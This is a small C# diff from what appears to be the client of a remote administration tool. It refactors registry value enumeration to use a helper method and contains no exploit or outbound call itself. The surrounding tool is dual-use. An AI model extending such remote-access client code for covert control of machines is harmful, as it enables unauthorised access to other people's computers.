@@ -103,7 +103,7 @@ namespace xClient.Core.Registry
                 {
                     RegistryValueKind valueType = key.GetValueKind(valueName);
                     object valueData = key.GetValue(valueName);
-                    values.Add(new RegValueData {Name = valueName, Kind = valueType, Data = valueData});
+                    values.Add(RegistryKeyHelper.CreateRegValueData(valueName, valueType, valueData));
                 }
 
                 AddMatch(keyName, RegistryKeyHelper.AddDefaultValue(values), key.SubKeyCount);
